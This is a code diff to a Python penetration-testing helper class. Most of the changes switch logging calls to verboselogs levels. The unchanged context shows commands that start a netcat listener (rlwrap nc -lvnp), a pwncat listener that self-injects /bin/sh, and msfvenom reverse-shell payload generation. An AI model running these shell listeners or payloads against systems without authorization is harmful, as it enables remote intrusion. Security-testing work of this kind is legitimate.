@@ -3,6 +3,8 @@ import sys
 from enum import Enum
 from typing import Union
 
+import verboselogs
+
 from ..utils.defaultLogBanner import log_runBanner
 from ..utils.utils import Context, Utils
 
@@ -66,7 +68,7 @@ class ToolService:
                 ['wget', url, '-P', path]
             ])
 
-        logging.log(logging.INFO, f'[*] {service_name} Done! View the log reports under {path}/')
+        logging.log(verboselogs.SUCCESS, f'[*] {service_name} Done! View the log reports under {path}/')
 
     # --------------------------------------------------------------------------
     #
@@ -120,10 +122,10 @@ class ToolService:
 
         cmd = use_sudo + ['rlwrap', 'nc', '-lvnp', str(port)]
         log_runBanner(f'pwncat listening...')
-        logging.log(logging.NOTICE, " ".join(cmd))
+        logging.log(verboselogs.NOTICE, " ".join(cmd))
         self.utils.run_command_endless(command_list=cmd)
 
-        logging.log(logging.INFO, f'[*] {service_name} Done! View the log reports under {path}/')
+        logging.log(verboselogs.SUCCESS, f'[*] {service_name} Done! View the log reports under {path}/')
 
     def pwncat(self, host: Union[str, None] = None, port: int = 9001) -> None:
         '''
@@ -142,10 +144,10 @@ class ToolService:
 
         cmd = use_sudo + ['pwncat', '-l', str(port), '-vv', '--self-inject', f'/bin/sh:{host}:{port}']
         log_runBanner(f'pwncat listening...')
-        logging.log(logging.NOTICE, " ".join(cmd))
+        logging.log(verboselogs.NOTICE, " ".join(cmd))
         self.utils.run_command_endless(command_list=cmd)
 
-        logging.log(logging.INFO, f'[*] {service_name} Done! View the log reports under {path}/')
+        logging.log(verboselogs.SUCCESS, f'[*] {service_name} Done! View the log reports under {path}/')
 
     # --------------------------------------------------------------------------
     #
@@ -177,10 +179,11 @@ class ToolService:
         reverse_arch = [f'-a{arch}']
 
         self.utils.run_command_output_loop(f'msfvenom create reverse shell...', [
-            ['msfvenom'] + reverse_payload + [f'LHOST={host}', f'LPORT={port}', '-o', f'{path}/reverse_shell.{format}'] + reverse_format + reverse_arch
+            ['msfvenom'] + reverse_payload + [f'LHOST={host}', f'LPORT={port}',
+                                              '-o', f'{path}/reverse_shell.{format}'] + reverse_format + reverse_arch
         ])
 
-        logging.log(logging.INFO, f'[*] {service_name} Done! View the log reports under {path}/')
+        logging.log(verboselogs.SUCCESS, f'[*] {service_name} Done! View the log reports under {path}/')
 
     # --------------------------------------------------------------------------
     #
@@ -201,7 +204,7 @@ class ToolService:
             ['tee', f'{path}/pywhat.log']
         ])
 
-        logging.log(logging.INFO, f'[*] {service_name} Done! View the log reports under {path}/')
+        logging.log(verboselogs.SUCCESS, f'[*] {service_name} Done! View the log reports under {path}/')
 
     # --------------------------------------------------------------------------
     #
@@ -248,4 +251,4 @@ class ToolService:
             extract_type + [file]
         ])
 
-        logging.log(logging.INFO, f'[*] {service_name} Done! View the log reports under {path}/')
+        logging.log(verboselogs.SUCCESS, f'[*] {service_name} Done! View the log reports under {path}/')
